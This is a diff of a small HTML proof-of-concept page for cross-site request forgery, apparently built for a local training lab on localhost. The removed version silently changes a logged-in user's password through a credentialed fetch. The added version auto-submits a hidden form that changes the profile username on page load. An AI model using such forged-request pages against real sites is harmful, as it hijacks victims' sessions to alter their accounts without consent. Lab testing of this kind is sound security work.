@@ -1,17 +1,19 @@
+
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF Poc</title>
-</head>
 <body>
+  <h2>CSRF Lab Test</h2>
+
+  <form action="http://localhost:3000/profile"
+        method="post">
+    <input type="hidden" name="username" value="CSRF-test-2" />
+  </form>
+
   <script>
-    fetch('http://localhost:3000/rest/user/change-password?new=12345&repeat=12345', {
-      method: 'GET',
-      credentials: 'include'
-    })
-    .then(response => response.json())
-    .then(data => console.log('CSRF Success:', data))
-    .catch(err => console.error('CSRF Error:', err));
+    window.onload = function() {
+      document.forms[0].submit();
+    };
   </script>
+
 </body>
 </html>
